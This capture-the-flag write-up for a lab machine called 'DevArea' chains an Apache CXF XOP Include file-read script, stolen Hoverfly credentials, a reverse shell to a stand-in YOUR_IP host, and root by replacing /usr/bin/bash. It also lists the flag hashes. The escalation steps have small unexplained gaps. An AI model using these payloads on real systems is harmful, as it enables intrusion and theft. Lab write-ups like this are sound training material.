## Machine Info

|Field|Details|
|---|---|
|Name|DevArea|
|Difficulty|Medium|
|OS|Linux (Ubuntu 24)|
|IP|10.129.19.225|

---

## Reconnaissance

### Port Scan

```bash
rustscan -a 10.129.19.225 -- -sC -sV -T4
```

**Open Ports:**

|Port|Service|Notes|
|---|---|---|
|21|vsftpd 3.0.5|Anonymous FTP login allowed|
|22|OpenSSH 9.6p1|Standard SSH|
|80|Apache 2.4.58|Redirects to `http://devarea.htb/`|
|8080|Jetty 9.4.27|Employee SOAP service|
|8500|Hoverfly Proxy|Proxy port|
|8888|Hoverfly Dashboard|Go HTTP server|

Add to `/etc/hosts`:

```bash
echo "10.129.19.225  devarea.htb" | sudo tee -a /etc/hosts
```

---

## Foothold

### FTP Anonymous Login

```bash
wget -r ftp://anonymous:@10.129.19.225/pub/
```

Downloaded a `.jar` file from the `pub/` directory. Decompiled with `jadx`:

```bash
jadx employee-service.jar
```

Decompiled source revealed a SOAP endpoint at `/employeeservice` on port 8080.

```bash
curl http://devarea.htb:8080/employeeservice?wsdl
```

WSDL confirmed a `submitReport` operation accepting a `report` object with a `content` field.

---

### CVE-2022-46364 — Apache CXF XOP Include SSRF (File Read)

The SOAP endpoint runs on Apache CXF and is vulnerable to CVE-2022-46364. An `<xop:Include>` tag inside a MTOM multipart SOAP request forces the server to fetch a local file URI and return its contents base64-encoded.

**Exploit script:**

```bash
cat << 'EOF' > lfi.sh
#!/bin/bash

# Usage: ./lfi.sh <file>
# Example: ./lfi.sh /proc/self/environ

if [ $# -ne 1 ]; then
    echo "Usage: $0 <file>"
    exit 1
fi

FILE=$1

RESPONSE=$(curl -s -X POST "http://devarea.htb:8080/employeeservice" \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<rootpart@soapui.org>"; start-info="text/xml"' \
  --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@soapui.org>\r\n\r\n<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\r\n  <soap:Body>\r\n    <ns2:submitReport xmlns:ns2="http://devarea.htb/">\r\n      <arg0>\r\n        <confidential>true</confidential>\r\n        <content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file://'"$FILE"'"/></content>\r\n        <department>test</department>\r\n        <employeeName>test</employeeName>\r\n      </arg0>\r\n    </ns2:submitReport>\r\n  </soap:Body>\r\n</soap:Envelope>\r\n--MIMEBoundary--')

# Extract only the Base64 payload inside <return>...</return>
BASE64_CONTENT=$(echo "$RESPONSE" | sed -n 's/.*Content: //p' | sed 's/<\/return>.*//')

# Decode and print
echo "$BASE64_CONTENT" | base64 -d

EOF
chmod +x lfi.sh
```

**Read `/etc/passwd`:**

```bash
./lfi.sh /etc/passwd
```

Identified user with shell access: `dev_ryan`

---

### Hoverfly Credentials via LFI

```bash
./lfi.sh /etc/systemd/system/hoverfly.service
```

```ini
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
```

**Credentials:** `admin:O7IJ27MyyXiU`

---

### Hoverfly Authenticated RCE via Middleware

Hoverfly's middleware feature executes a script on every proxied request. The API uses JWT authentication, not HTTP Basic Auth.

**Step 1 — Get JWT token:**

```bash
TOKEN=$(curl -s -X POST http://10.129.19.225:8888/api/token-auth \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin", "password": "O7IJ27MyyXiU"}' \
  | grep -oP '(?<="token":")[^"]+')
```

**Step 2 — Start listener:**

```bash
# Terminal 1
nc -lvnp 4444
```


**Step 3 — Inject reverse shell middleware:**

```bash
# Terminal 2 — trigger middleware execution
curl -s -X PUT http://10.129.19.225:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"binary": "/bin/bash", "script": "#!/bin/bash\nbash -i >& /dev/tcp/YOUR_IP/4444 0>&1\ncat"}'
  

curl -s -x http://admin:O7IJ27MyyXiU@10.129.19.225:8500 http://example.com/
```

Shell received as `dev_ryan`.

```bash
cat /home/dev_ryan/user.txt
```

> `7838fb963fb0e6c7bafb533f5be88dd5`

---

## Privilege Escalation

### Enumeration

```bash
sudo -l
```

```
(root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop,
!/opt/syswatch/syswatch.sh web-restart
```

`dev_ryan` can run `syswatch.sh` as root with any argument except `web-stop` and `web-restart`.

Reading `/usr/local/bin/syswatch` revealed the script sources a config file and calls `bash` to execute plugins. The key insight: **`/usr/bin/bash` is called by the script running as root**.

### PATH Hijack via Bash Replacement

The script calls `bash` as root. By replacing `/usr/bin/bash` with a malicious wrapper, any `sudo` invocation of `syswatch.sh` executes our payload as root.

**The problem:** `/usr/bin/bash` is kept busy by running bash processes including our own shell session. The solution is to migrate the current session to `sh` before killing all bash processes.

**Step 1 — Create malicious bash wrapper in `/tmp`:**

```bash
cat > /tmp/bash << 'EOF'
#!/bin/dash
echo "[+] ROOT SHELL via PATH hijack"
exec /bin/dash -i
EOF
chmod +x /tmp/bash
```

**Step 2 — Migrate current session away from bash:**

```bash
exec /bin/sh
```

**Step 3 — Kill all bash processes and replace the binary:**

```bash
kill -9 $(fuser /usr/bin/bash 2>/dev/null | tr -d 'e ')
cp /tmp/bash /usr/bin/bash
```

**Step 4 — Trigger as root:**

```bash
sudo /opt/syswatch/syswatch.sh --version
```

Root shell obtained.

```bash
cat /root/root.txt
```

> `33ed03ea60d9d986fc6a777a8c10ba17`

---

## Flags

|Flag|Hash|
|---|---|
|user.txt|`7838fb963fb0e6c7bafb533f5be88dd5`|
|root.txt|`33ed03ea60d9d986fc6a777a8c10ba17`|

---

## Attack Chain

```
FTP Anonymous Login
       ↓
Download & Decompile JAR → /employeeservice endpoint
       ↓
CVE-2022-46364 XOP Include → Arbitrary File Read
       ↓
Read hoverfly.service → admin:O7IJ27MyyXiU
       ↓
Hoverfly JWT Auth → Middleware RCE → Shell as dev_ryan
       ↓
sudo -l → syswatch.sh allowed as root
       ↓
exec /bin/sh → kill bash PIDs → replace /usr/bin/bash
       ↓
sudo syswatch.sh → root shell
```